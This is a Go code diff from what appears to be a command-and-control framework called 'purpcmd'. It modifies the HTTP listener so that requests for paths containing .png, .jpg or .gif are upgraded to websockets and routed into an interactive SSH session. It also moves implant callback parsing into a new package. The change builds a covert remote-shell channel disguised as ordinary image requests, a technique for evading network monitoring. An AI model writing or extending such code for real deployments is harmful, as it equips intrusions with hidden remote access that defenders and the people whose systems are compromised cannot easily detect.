@@ -4,11 +4,33 @@ import (
 	"io"
 	"net/http"
 	"purpcmd/internal"
-	imp "purpcmd/server/implant"
+	"purpcmd/server/callback"
+	//imp "purpcmd/server/implant"
 	"purpcmd/server/log"
+	"purpcmd/server/ssh"
+	"purpcmd/server/utils"
+	"strings"
+
+	"github.com/gorilla/websocket"
 )
 
 func (l *Listener)root(w http.ResponseWriter, r *http.Request) {
+	if strings.Contains(r.URL.Path, ".png") || strings.Contains(r.URL.Path, ".jpg") || strings.Contains(r.URL.Path, ".gif") {
+		up := websocket.Upgrader{}
+		conn, err := up.Upgrade(w, r, nil)
+		if err != nil {
+			log.AsyncWriteStdoutErr(err.Error())
+			return
+		}
+	
+		
+		webSockConn := utils.New(conn) // New addapter
+		log.AsyncWriteStdoutInfo("initiating interactive session")
+		ssh.Connector(webSockConn)
+
+		return
+	}
+
 	a,task := processPayload(r)
 	
 	if uint16(a) == internal.NIL {
@@ -50,5 +72,6 @@ func processPayload(r *http.Request) (uint16, []byte) {
 		}
 	}
 
-	return imp.ParseCallback(data, r, name)
+	
+	return callback.ParseCallback(data, r, name)
 }
